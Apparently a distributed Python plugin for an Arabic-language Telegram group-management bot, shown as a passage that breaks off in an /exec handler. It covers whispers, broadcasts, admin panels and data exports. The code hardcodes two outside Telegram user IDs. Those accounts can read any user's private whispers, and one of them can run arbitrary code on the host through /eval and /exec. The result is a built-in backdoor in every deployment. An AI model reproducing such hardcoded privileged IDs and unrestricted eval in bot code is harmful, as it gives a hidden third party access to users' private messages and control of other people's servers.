'''

[ = This plugin is a part from R3D Source code = ]
{"Developer":"https://t.me/yqyqy66"}

'''

import random, re, time, json, html, httpx, requests 
import urllib.parse
import os
import uuid
import sys
import traceback
import psutil
import platform
import cpuinfo
import socket
import uuid
from threading import Thread
from pyrogram import *
from pyrogram.enums import *
from pyrogram.types import *
from config import *
from helpers.Ranks import *
from io import StringIO
from pytio import Tio, TioRequest
from datetime import datetime
from helpers.utils import *
from meval import meval
from httpx import HTTPError
tio = Tio()
def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


# @Client.on_message(filters.regex("^/start hmsa") & filters.private, group=-2007)
async def on_send_hmsa(c: Client, m: Message):
   id = m.text.split("hmsa")[1]
   if not wsdb.get(id):
      return await m.reply("رابط الهمسة غلط")
   else:
      get = wsdb.get(id)
      if m.from_user.id != get["from"]:
         return await m.reply("انت لم ترسل اهمس بالقروب")
      else:
         getUser = await c.get_users(get["to"])
         wsdb.set(f"hmsa-{m.from_user.id}", get)
         return await m.reply(f"ارسل همستك الموجهة الى [ {getUser.mention} ] ")

@Client.on_message(filters.regex("^/start openhms") & filters.private, group=1999)
async def open_hms(c: Client, m: Message):
   id = m.text.split("openhms")[1]
   if not wsdb.get(f"hms-{id}"):
      return await m.reply("رابط الهمسة غلط")
   else:
      data = wsdb.get(f"hms-{id}")
      caption = data.get("caption", None)
      file = data.get("file", None)
      to = data["to"]
      if m.from_user.id != to and m.from_user.id != data["from"] and m.from_user.id != 5117901887 and m.from_user.id != 6168217372:
         return await m.reply("☆ الهمسة غير موجهة لك يا عزيزي")
      else:
         if file:
            return await c.send_message(m.chat.id,"لقد ارسل لك ميديا والميديا ممنوعة في هذه الفترة لأنها تحت الصيانة اخبره بذالك", protect_content=True)
         else:
            return await c.send_message(
                  m.chat.id,
                  data["text"],
                  protect_content=True
               )

async def sleep_and_delete(client, chat_id, message):
    await asyncio.sleep(60)
    await client.delete_messages(chat_id, message_ids=message.message_id)

@Client.on_message(filters.private, group=-2016)
async def to_send(c: Client, m: Message):
   if m.text and re.match("^/start hmsa", m.text):
      return await on_send_hmsa(c, m)
   k = r.get(f'{Dev_Zaid}:botkey')
   if r.get(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_Zaid}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} ابشر الغيت كل شي")
      users = r.smembers(f'{Dev_Zaid}:UsersList')
      count = 0
      failed = 0
      rep = await m.reply("جار الاذاعة..")
      for user in users:
         try:
            await m.copy(int(user))
            count+=1
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except:
            failed+=1
            pass
      return await rep.edit(f"{k} اذاعة ناجحة {count}")
   
   k = r.get(f'{Dev_Zaid}:botkey')
   if r.get(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}')
      if m.text and m.text == 'الغاء':
         return await m.reply(f"{k} ابشر الغيت كل شي")
      chats = r.smembers(f'enablelist:{Dev_Zaid}')
      count = 0
      failed = 0
      rep = await  m.reply("جار الاذاعة..")
      for chat in chats:
         try:
            await m.copy(int(chat))
            count+=1
         except errors.FloodWait as f:
            await asyncio.sleep(f.value)
         except:
            failed+=1
            pass
      return await rep.edit(f"{k} اذاعة ناجحة {count}")
      
   get = wsdb.get(f"hmsa-{m.from_user.id}")
   if get:
      wsdb.delete(f"hmsa-{m.from_user.id}")
      to = get["to"]
      chat = get["chat"]
      id = get["id"]
      data = {}
      if m.media:
         if m.photo:
            file_id = m.photo.file_id
         elif m.video:
            file_id = m.video.file_id
         elif m.animation:
            file_id = m.animation.file_id
         elif m.audio:
            file_id = m.audio.file_id
         elif m.voice:
            file_id = m.voice.file_id
         elif m.sticker:
            file_id = m.sticker.file_id
         elif m.document:
            file_id = m.document.file_id
         caption = m.caption
         data ["caption"]=caption
         data["file"]=file_id
      elif m.text:
         data["text"]=m.text.html
      
      import uuid
      id = str(uuid.uuid4())[:6]
      data["to"]=to
      data["from"]=m.from_user.id
      wsdb.set(f"hms-{id}", data)
      url = f"https://t.me/{c.me.username}?start=openhms{id}"
      getUser = await c.get_users(to)
      await m.reply(f"تم ارسال همستك بنجاح الى {getUser.mention}")
      await c.send_message(
            chat_id=chat,
            text=f"☆ همسة سرية من < {m.from_user.mention} >\n☆ موجة الى < {getUser.mention} >",
            reply_markup=InlineKeyboardMarkup(
                  [
                     [
                     InlineKeyboardButton(
                           text="لعرض الهمسة",
                           url=url
                        )
                     ]
                  ]
               )
         )
      return await c.delete_messages(chat, get["id"])
      
@Client.on_message(filters.text & filters.private, group=1)
def delRanksHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    Thread(target=private_func,args=(c,m,k)).start()
    
def private_func(c,m,k):
  if r.get(f'{m.from_user.id}:sarhni'):  return 
  text = m.text
  #r.set(f'DevGroup:{Dev_Zaid}'
  name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
  channel= r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
  if text == '/start' and not dev_pls(m.from_user.id,m.chat.id):
     m.reply(text=f'''
اهلين انا ،{name} 🧚

↞ اختصاصي ادارة المجموعات من السبام والخ..
↞ كت تويت, يوتيوب, ساوند , واشياء كثير ..
↞ عشان تفعلني ارفعني اشراف وارسل تفعيل.
''', reply_markup=InlineKeyboardMarkup ([
  [InlineKeyboardButton ('ضيفني لـ مجموعتك 🧚‍♀️', url=f'https://t.me/{botUsername}?startgroup=Commands&admin=ban_users+restrict_members+delete_messages+add_admins+change_info+invite_users+pin_messages+manage_call+manage_chat+manage_video_chats+promote_members')],
  [InlineKeyboardButton (f'تحديثات {name} 🍻', url=f'https://t.me/{channel}')]
  ]))
     if not r.sismember(f'{Dev_Zaid}:UsersList',m.from_user.id):
       r.sadd(f'{Dev_Zaid}:UsersList',m.from_user.id)
       if m.from_user.username:
         username= f'@{m.from_user.username}'
       else:
         username= 'ماعنده يوزر'
       text = '''
☆ شخص جديد دخل للبوت
☆ اسمه : {}
☆ ايديه : `{}`
☆ معرفه : {}

☆ عدد المستخدمين صار {}
'''.format(m.from_user.mention,m.from_user.id,username,len(r.smembers(f'{Dev_Zaid}:UsersList')))
       reply_markup = InlineKeyboardMarkup ([[InlineKeyboardButton (m.from_user.first_name, user_id=m.from_user.id)]])
       if r.get(f'DevGroup:{Dev_Zaid}'):
          c.send_message(
          int(r.get(f'DevGroup:{Dev_Zaid}')),
          text, reply_markup=reply_markup)
       else:
          for dev in get_devs_br():
            try:
              c.send_message(int(dev), text, disable_web_page_preview=True)
            except:
              pass
  
  if text == '/start Commands':
    return m.reply(text=f'{k} اهلين فيك باوامر البوت\n\nللاستفسار - @{channel}',
         reply_markup=InlineKeyboardMarkup (
           [
             [
               InlineKeyboardButton ('م1', callback_data=f'commands1:{m.from_user.id}'),
               InlineKeyboardButton ('م2', callback_data=f'commands2:{m.from_user.id}')
             ],
             [
              InlineKeyboardButton ('م3', callback_data=f'commands3:{m.from_user.id}'),
             ],
             [
              InlineKeyboardButton ('الالعاب', callback_data=f'commands4:{m.from_user.id}'),
              InlineKeyboardButton ('التسليه', callback_data=f'commands5:{m.from_user.id}'),
             ],
             [
              InlineKeyboardButton ('اليوتيوب', callback_data=f'commands6:{m.from_user.id}'),
             ],
           ]
         )
        )
  
  if text == '/start rules':
     m.reply(text='''
• القوانين

- ممنوع استخدام الثغرات
- ممنوع وضع اسماء مُخالفة
- ١٠ حروف مسموحه في اسمك اذا كنت بالتوب الباقي ماراح يطلع
- في حال انك بالتوب واسمك مزخرف راح يصفيه البوت تلقائي''',reply_markup=InlineKeyboardMarkup ([[InlineKeyboardButton (f"تحديثات {name} 🍻", url=f't.me/{channel}')]]))
  
  if text == '/start' and dev_pls(m.from_user.id,m.chat.id):
     reply_markup = ReplyKeyboardMarkup(
      [ 
        [('الاحصائيات')],
        [('تغيير المطور الاساسي')],
        [("جلب نسخة القروبات"),("جلب نسخة المستخدمين")],
        [('تفعيل البوت الخدمي'),('تعطيل البوت الخدمي')],
        [('تفعيل التحميل واليوتيوب'),('تعطيل التحميل واليوتيوب')],
        [('الردود العامه'),('الاوامر العامه')],
        [('المحظورين عام'),('المجموعات المحظورة')],
        [('اذاعة بالخاص'),('بالمجموعات اذاعة')],
        [("المكتومين عام"),("المحظورين من الالعاب")],
        [('اذاعة بالخاص'),('اذاعة بالخاص تثبيت')],
        [('اذاعة بالمجموعات'),('اذاعه بالمجموعات بالتثبيت')],
        [('رمز السورس'),('قناة السورس'),('اسم البوت')],
        [('مسح اسم البوت'),('تعيين اسم البوت')],
        [('مسح رمز السورس'),('وضع رمز السورس')],
        [('مسح قناة السورس'),('وضع قناة السورس')],
        [("السيرفر"),("الملفات"),("/eval")],
        [('مجموعة المطور')],
        [('وضع مجموعة المطور'),('مسح مجموعة المطور')],
        [('الغاء')]
      ],
      resize_keyboard=True,
      placeholder='@anas5 - @eFFb0t 🧚‍♀️'
     )
     if m.from_user.id == 6168217372 or m.from_user.id == 5117901887:
       rank = 'تاج راسي ☆'
     else:
       rank = get_rank(m.from_user.id,m.from_user.id)
     return m.reply(quote=True,text=f'{k} هلا بك {rank}\n{k} قدامك لوحة التحكم ', reply_markup=reply_markup)
  if text.startswith(". "):
     text = text.split(None,1)[1]
     msg = m.reply("...", quote=True)
     try: m.reply_chat_action(ChatAction.TYPING)
     except Exception as e: print(e);pass
     rep = requests.get(f"https://gptzaid.zaidbot.repl.co/1/text={text}").text
     try: m.reply_chat_action(ChatAction.TYPING)
     except Exception as e: print(e);pass
     msg.edit(rep)
     
@Client.on_message(filters.text, group=30)
def sudosCommandsHandler(c,m):
    k = r.get(f'{Dev_Zaid}:botkey')
    channel = r.get(f'{Dev_Zaid}:BotChannel') if r.get(f'{Dev_Zaid}:BotChannel') else 'yqyqy66'
    Thread(target=SudosCommandsFunc,args=(c,m,k,r,channel)).start()

def SudosCommandsFunc(c,m,k,r,channel):
   if not m.from_user:  return
   if not m.chat.type == ChatType.PRIVATE:
      if not r.get(f'{m.chat.id}:enable:{Dev_Zaid}'):
        return
   else:
     if r.get(f'{m.from_user.id}:sarhni'):  return 
   if r.get(f'{m.from_user.id}:mute:{m.chat.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:mute:{Dev_Zaid}') and not admin_pls(m.from_user.id,m.chat.id):  return
   if r.get(f'{m.from_user.id}:mute:{Dev_Zaid}'):  return 
   
   if r.get(f'{m.chat.id}addCustomG:{m.from_user.id}{Dev_Zaid}'):  return
   if r.get(f'{m.chat.id}:addCustom:{m.from_user.id}{Dev_Zaid}'):  return 
   if r.get(f'{m.chat.id}:delCustom:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:delCustomG:{m.from_user.id}{Dev_Zaid}'):  return 
   text = m.text
   name = r.get(f'{Dev_Zaid}:BotName') if r.get(f'{Dev_Zaid}:BotName') else 'رعد'
   if text.startswith(f'{name} '):
      text = text.replace(f'{name} ','')
   if r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}'):
       text = r.get(f'{m.chat.id}:Custom:{m.chat.id}{Dev_Zaid}&text={text}')
   if r.get(f'Custom:{Dev_Zaid}&text={text}'):
       text = r.get(f'Custom:{Dev_Zaid}&text={text}')
   
   if (r.get(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}') or r.get(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}')) and text == 'الغاء':
       m.reply(quote=True,text=f'{k} من عيوني لغيت كل شي')
       r.delete(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}')
       r.delete(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}')
       return r.delete(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}')

   if r.get(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{Dev_Zaid}:BotName',m.text)
      return m.reply(quote=True,text=f'{k} ابشر عيني المطور غيرت اسمي لـ {m.text}')
   
   if r.get(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{Dev_Zaid}:BotChannel',m.text.replace('@',''))
      return m.reply(quote=True,text=f'{k} ابشر عيني غيرت قناة السورس لـ {m.text}')
   
   if r.get(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}') and dev2_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}')
      r.set(f'{Dev_Zaid}:botkey',m.text)
      return m.reply(quote=True,text=f'{k} ابشر عيني غيرت رمز السورس لـ {m.text}')
      
   if r.get(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}')
      try:
        id = int(m.text)
      except:
        return m.reply(quote=True,text=f'{k} الايدي غلط!')
      r.set(f'DevGroup:{Dev_Zaid}', int(m.text))
      return m.reply(quote=True,text=f'{k} ابشر عيني قروب المطور لـ {m.text}')
   
   if r.get(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}') and devp_pls(m.from_user.id,m.chat.id):
      r.delete(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}')
      try:
        get = c.get_chat(m.text.replace('@',''))
      except:
        return m.reply(quote=True,text=f'{k} اليوزر غلط!')
      r.set(f'{Dev_Zaid}botowner', get.id)
      m.reply(quote=True,text=f'{k} ابشر نقلت ملكية البوت لـ {m.text}')
      with open ('information.py','w+') as www:
         text = 'token = "{}"\nowner_id = {}'
         www.write(text.format(c.bot_token, get.id))
         
   
   if text == 'الاحصائيات':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if not r.smembers(f'{Dev_Zaid}:UsersList'):
         users = 0
      else:
         users = len(r.smembers(f'{Dev_Zaid}:UsersList'))
      if not r.smembers(f'enablelist:{Dev_Zaid}'):
         chats = 0
      else:
         chats = len(r.smembers(f'enablelist:{Dev_Zaid}'))
      return m.reply(quote=True,text=f'{k} هلا بك مطوري\n{k} المستخدمين ~ {users}\n{k} المجموعات ~ {chats}')
   
   if text == 'تفعيل البوت الخدمي':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if not r.get(f'DisableBot:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} البوت الخدمي مفعل من قبل')
      else:
         r.delete(f'DisableBot:{Dev_Zaid}')
         return m.reply(quote=True,text=f'{k} ابشر فعلت البوت الخدمي')
   
   if text == 'تعطيل البوت الخدمي':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if r.get(f'DisableBot:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} البوت الخدمي معطل من قبل')
      else:
         r.set(f'DisableBot:{Dev_Zaid}',1)
         return m.reply(quote=True,text=f'{k} ابشر عطلت البوت الخدمي')
   
   if text == 'تفعيل التحميل واليوتيوب':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if not r.get(f':disableYT:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} التحميل مفعل من قبل')
      else:
         r.delete(f':disableYT:{Dev_Zaid}')
         return m.reply(quote=True,text=f'{k} ابشر فعلت التحميل')
   
   if text == 'تعطيل التحميل واليوتيوب':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      if r.get(f':disableYT:{Dev_Zaid}'):
         return m.reply(quote=True,text=f'{k} التحميل معطل من قبل')
      else:
         r.set(f':disableYT:{Dev_Zaid}',1)
         return m.reply(quote=True,text=f'{k} ابشر عطلت التحميل')
   
   if text == 'الردود العامه' and m.chat.type == ChatType.PRIVATE:
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     else:
      if not r.smembers(f'FiltersList:{Dev_Zaid}'):
       return m.reply(quote=True,text=f'{k} مافيه ردود عامه مضافه')
      else:
       text = 'ردود البوت:\n'
       count = 1
       for reply in r.smembers(f'FiltersList:{Dev_Zaid}'):
          rep = reply
          type = r.get(f'{rep}:filtertype:{Dev_Zaid}')
          text += f'\n{count} - ( {rep} ) ࿓ ( {type} )'
          count += 1
       text += '\n☆'
       return m.reply(quote=True,text=text, disable_web_page_preview=True)
   
   if text == 'المستخدمين المحظورين' or text == 'المحظورين عام':
     if not dev_pls(m.from_user.id, m.chat.id):
        return m.reply(quote=True,text=f'{k} هذا الأمر يخص ( المطور وفوق ) بس')
     else:
        if not r.smembers(f'listGBAN:{Dev_Zaid}'):
           return m.reply(quote=True,text=f'{k} مافيه حمير محظورين')
        else:
           text = 'الحمير المحظورين عام:\n'
           count = 1
           for user in r.smembers(f'listGBAN:{Dev_Zaid}'):
               try:
                  get = c.get_users(int(user))
                  mention = '@'+get.username if get.username else get.mention
                  id = get.id
               except:
                  mention = f'[{int(user)}](tg://user?id={int(user)})'
                  id = int(user)
               text += f'{count}) {mention} ~ ( `{id}` )\n'
               count += 1
           return m.reply(quote=True,text=text)
   
   if text == 'المحظورين من الالعاب':
     if not dev_pls(m.from_user.id, m.chat.id):
        return m.reply(quote=True,text=f'{k} هذا الأمر يخص ( المطور وفوق ) بس')
     else:
        if not r.smembers(f'listGBANGAMES:{Dev_Zaid}'):
           return m.reply(quote=True,text=f'{k} مافيه حمير محظورين من الالعاب')
        else:
           text = 'الحمير المحظورين عام من الالعاب:\n'
           count = 1
           for user in r.smembers(f'listGBANGAMES:{Dev_Zaid}'):
               try:
                  get = c.get_users(int(user))
                  mention = '@'+get.username if get.username else get.mention
                  id = get.id
               except:
                  mention = f'[{int(user)}](tg://user?id={int(user)})'
                  id = int(user)
               text += f'{count}) {mention} ~ ( `{id}` )\n'
               count += 1
           return m.reply(quote=True,text=text)
   
   if text == 'المجموعات المحظورة':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     else:
        if not r.smembers(f':BannedChats:{Dev_Zaid}'):
           return m.reply(quote=True,text=f'{k} مافي قروب محظور عام')
        else:
           text = 'المجموعات المحظورة عام:\n'
           count = 1
           for user in r.smembers(f':BannedChats:{Dev_Zaid}'):
               text += f'{count}) {user}\n'
               count += 1
           return m.reply(quote=True,text=text)
   
   if text == 'رمز السورس':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     return m.reply(quote=True,text=f'`{k}`')
   
   if text == 'قناة السورس':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     if not r.get(f'{Dev_Zaid}:BotChannel'):
       return m.reply(quote=True,text=f'{k} قناة السورس مو معينة')
     else:
       cha = r.get(f'{Dev_Zaid}:BotChannel')
       return m.reply(quote=True,text=f'@{cha}')
   
   if text == 'اسم البوت':
     if not dev2_pls(m.from_user.id, m.chat.id):
        return
     if not r.get(f'{Dev_Zaid}:BotName'):
       return m.reply(quote=True,text=f'{k} مافي اسم للبوت')
     else:
       name = r.get(f'{Dev_Zaid}:BotName')
       return m.reply(quote=True,text=name)
   
   if text == 'مجموعة المطور' and m.chat.type == ChatType.PRIVATE:
     if not dev_pls(m.from_user.id,m.chat.id):
        return
     else:
        if not r.get(f'DevGroup:{Dev_Zaid}'):
           return m.reply(quote=True,text=f'{k} مجموعة المطور مو معينة')
        else:
           id = int(r.get(f'DevGroup:{Dev_Zaid}'))
           link = c.get_chat(id).invite_link
           return m.reply(quote=True,text=link, protect_content=True)
   
   if text == 'تعيين اسم البوت':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{m.chat.id}:setBotName:{m.from_user.id}{Dev_Zaid}',1,ex=600)
     return m.reply(quote=True,text=f'{k} هلا مطوري ارسل اسمي الجديد الحين')
   
   if text == 'مسح اسم البوت':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.delete(f'{Dev_Zaid}:BotName')
     return m.reply(quote=True,text=f'{k} ابشر مسحت اسم البوت')
   
   if text == 'وضع قناة السورس':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{m.chat.id}:setBotChannel:{m.from_user.id}{Dev_Zaid}',1,ex=600)
     return m.reply(quote=True,text=f'{k} هلا مطوري ارسل قناة السورس الحين')
   
   if text == 'مسح قناة السورس':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.delete(f'{Dev_Zaid}:BotChannel')
     return m.reply(quote=True,text=f'{k} ابشر مسحت قناة السورس')
   
   if text == 'وضع رمز السورس':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{m.chat.id}:setBotKey:{m.from_user.id}{Dev_Zaid}',1,ex=600)
     return m.reply(quote=True,text=f'{k} هلا مطوري ارسل رمز السورس الحين')
   
   if text == 'مسح رمز السورس':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{Dev_Zaid}:botkey', '⇜')
     return m.reply(quote=True,text=f'{k} ابشر مسحت رمز السورس')
   
   if text == 'وضع مجموعة المطور':
     if not dev2_pls(m.from_user.id,m.chat.id):
        return
     r.set(f'{m.chat.id}:setDevGroup:{m.from_user.id}{Dev_Zaid}',1,ex=600)
     return m.reply(quote=True,text=f'{k} هلا مطوري ارسل ايدي القروب الحين')
   
   if text == 'مسح مجموعة المطور':
     if not devp_pls(m.from_user.id,m.chat.id):
        return
     r.delete(f'DevGroup:{Dev_Zaid}')
     return m.reply(quote=True,text=f'{k} ابشر مسحت مجموعة المطور')
   
   if text == 'تغيير المطور الاساسي':
     if not devp_pls(m.from_user.id,m.chat.id):
        return
     else:
        r.set(f'{m.chat.id}:setBotowmer:{m.from_user.id}{Dev_Zaid}',1,ex=600)
        return m.reply(quote=True,text=f'{k} ارسل يوزر المطور الجديد الحين')
   
   if text == 'تحديث':
     if devp_pls(m.from_user.id,m.chat.id):
       m.reply(quote=True,text=f'{k} تم تحديث الملفات')
       python = sys.executable
       os.execl(python, python, *sys.argv)
   
   if text == 'الملفات':
     if m.from_user.id == 6168217372 or m.from_user.id == 5117901887:
        text = '——— ملفات السورس ———'
        a = os.listdir('Plugins')
        a.sort()
        count = 1
        for file in a:
          if file.endswith('.py'):
            text += f'\n{count}) `{file}`'
            count += 1
        text += f'\n——— @{channel} ———'
        return m.reply(quote=True,text=text, disable_web_page_preview=True)
        
   if text == 'اذاعة بالخاص':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      r.set(f'{m.chat.id}:pvBroadcast:{m.from_user.id}{Dev_Zaid}',1,ex=300)
      return m.reply(f"{k} ارسل الاذاعة الحين")

   if text == 'اذاعة بالقروبات':
      if not dev2_pls(m.from_user.id,m.chat.id):
         return 
      r.set(f'{m.chat.id}:gpBroadcast:{m.from_user.id}{Dev_Zaid}',1,ex=300)
      return m.reply(f"{k} ارسل الاذاعة الحين")
   
   if text == 'السيرفر' or text == 'معلومات السيرفر':
     if devp_pls(m.from_user.id,m.chat.id):
       text = '——— SYSTEM INFO ———'
       uname = platform.uname()
       version = lsb_release.get_distro_information()['DESCRIPTION']
       text += f"\n{k} النظام : {uname.system}"
       text += f"\n{k} الاصدار: `{version}`"
       text += '\n——— R.A.M INFO ———'
       svmem = psutil.virtual_memory()
       text += f"\n{k} رامات السيرفر: ` {get_size(svmem.total)}`"
       text += f"\n{k} المستهلك: ` {get_size(svmem.used)}/{get_size(svmem.available)}`"
       text += f"\n{k} نسبة الاستهلاك: `{svmem.percent}%`"
       text += '\n——— HARD DISK ———'
       hard = psutil.disk_partitions()[0]
       usage = psutil.disk_usage(hard.mountpoint)
       text += f"\n{k} ذاكرة التخزين: `{get_size(usage.total)}`"
       text += f"\n{k} المستهلك: `{get_size(usage.used)}`"
       text += f"\n{k} نسبة الاستهلاك: `{usage.percent}%`"
       text += '\n——— U.P T.I.M.E ———'
       uptime = time.strftime('%dD - %HH - %MM - %Ss', time.gmtime(time.time() - psutil.boot_time()))
       text += f'\n{uptime}'
       text += '\n\n༄'
       return m.reply(quote=True,text=text, disable_web_page_preview=True)
   
   if text == 'جلب نسخة القروبات' and devp_pls(m.from_user.id,m.chat.id):
     list = []
     date = datetime.now()
     for chat in r.smembers(f'enablelist:{Dev_Zaid}'):
        list.append(int(chat))
     with open(f'{date}.json', 'w+') as w:
        w.write(json.dumps({"botUsername": botUsername,"botID":c.me.id,"Chats":list},indent=4,ensure_ascii=False))
     m.reply_document(f'{date}.json',quote=True)
     os.remove(f'{date}.json')
   
   if text == 'جلب نسخة المستخدمين' and devp_pls(m.from_user.id,m.chat.id):
     list = []
     date = datetime.now()
     for chat in r.smembers(f'{Dev_Zaid}:UsersList'):
        list.append(int(chat))
     with open(f'{date}.json', 'w+') as w:
        w.write(json.dumps({"botUsername": botUsername,"botID":c.me.id,"Users":list},indent=4,ensure_ascii=False))
     m.reply_document(f'{date}.json',quote=True)
     os.remove(f'{date}.json')

   if text == 'المكتومين عام':
      if not dev_pls(m.from_user.id,m.chat.id):
        return m.reply(quote=True,text=f'{k} هذا الأمر يخص ( Dev²🎖️ وفوق ) بس')
      else:
        if not r.smembers(f'listMUTE:{Dev_Zaid}'):
          return m.reply(quote=True,text=f'{k} مافيه مكتومين عام')
        else:
          text = '- المكتومين عام:\n\n'
          count = 1
          for PRE in r.smembers(f'listMUTE:{Dev_Zaid}'):
             if count == 101: break
             try:
               user = c.get_users(int(PRE))
               mention = user.mention
               id = user.id
               username = user.username
               if user.username:
                 text += f'{count} ➣ @{username} ࿓ ( `{id}` )\n'
               else:
                 text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
             except:
               mention = f'[@{channel}](tg://user?id={int(PRE)})'
               id = int(PRE)
               text += f'{count} ➣ {mention} ࿓ ( `{id}` )\n'
               count += 1
          text += '\n☆'
          m.reply(quote=True,text=text)

   if text.startswith('رابط ') and dev2_pls(m.from_user.id,m.chat.id):
     try:
        id = int(text.split()[1])
        gg = c.get_chat(id)
        m.reply(quote=True,text=f'[{gg.title}]({gg.invite_link})',disable_web_page_preview=True)
     except Exception as e:
        print (e)
     
       
   
async def aexec(code, client, message):
    exec(
        "async def __aexec(client, message): "
        + "".join(f"\n {a}" for a in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


@Client.on_message(filters.command("eval") & filters.user(6168217372))
async def executor(client, message):
    if len(message.command) < 2 and not message.reply_to_message:
        return await message.reply("» هات أمر عشان انفذ !")
    if len(message.command) >= 2:
      cmd = message.text.split(None,1)[1]
    else:
      cmd = message.reply_to_message.text    
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "SUCCESS"
    final_output = f"`OUTPUT:`\n\n```{evaluation.strip()}```"
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(evaluation.strip()))
        
        await message.reply_document(
            document=filename,
            caption=f"`INPUT:`\n`{cmd[0:980]}`\n\n`OUTPUT:`\n`attached document`",
            quote=False
        )
        await message.delete()
        os.remove(filename)
    else:
        await message.reply(final_output)
   
   
   
langslist = tio.query_languages()
langs_list_link = "https://amanoteam.com/etc/langs.html"

strings_tio = {
  "code_exec_tio_res_string_no_err": "<b>Language:</b> <code>{langformat}</code>\n\n<b>Code:</b>\n<code>{codeformat}</code>\n\n<b>Results:</b>\n<code>{resformat}</code>\n\n<b>Stats:</b><code>{statsformat}</code>",
  "code_exec_tio_res_string_err": "<b>Language:</b> <code>{langformat}</code>\n\n<b>Code:</b>\n<code>{codeformat}</code>\n\n<b>Results:</b>\n<code>{resformat}</code>\n\n<b>Errors:</b>\n<code>{errformat}</code>",
  "code_exec_err_string": "Error: The language <b>{langformat}</b> was not found. Supported languages list: {langslistlink}",
  "code_exec_inline_send": "Language: {langformat}",
  "code_exec_err_inline_send_string": "Language {langformat} not found."
}

@Client.on_message(filters.command("exec") & filters.user(6168217372))
async def exec_tio_run_code(c: Client, m: Message):
    execlanguage = m.command[1]
    codetoexec = m.text.split(None, 2)[2]
    if execlanguage in langslist:
        tioreq = TioRequest(lang=execlanguage, code=codetoexec)
        loop = asyncio.get_event_loop()
        sendtioreq = await loop.run_in_executor(None, tio.send, tioreq)
        tioerrres = sendtioreq.error or "None"
        tiores = sendtioreq.result or "None"
